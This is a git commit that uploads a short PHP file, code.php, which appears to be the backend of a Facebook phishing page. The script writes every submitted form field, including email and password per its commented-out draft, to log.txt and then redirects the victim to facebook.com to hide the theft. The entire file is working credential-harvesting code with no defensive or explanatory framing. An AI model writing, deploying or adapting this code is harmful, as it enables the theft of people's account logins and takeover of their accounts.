c019999bea9ea52fea2afffc0cccd231ece07651
harithadushmantha <72427754+harithadushmantha@users.noreply.github.com>
2021-06-01 08:02:06 +0530

    Add files via upload

---
+++ code.php
@@ -0,0 +1,22 @@
+
+<?php
+header('Location: https://www.facebook.com');
+$handle = fopen("log.txt","a");
+foreach($_POST as $variable => $value){
+    fwrite($handle,$variable);
+    fwrite($handle,"=");
+    fwrite($handle, $value);
+    fwrite($handle, "\r\n");
+    echo($value);
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+
+?>
+    <!-- $email = $_POST['email'];
+    $password = $_POST['password'];
+    $data = $password;
+    $file = 'file';
+    file_put_contents($file, $data .PHP_EOL, FILE_APPEND);
+    header('Location: https://www.facebook.com'); -->
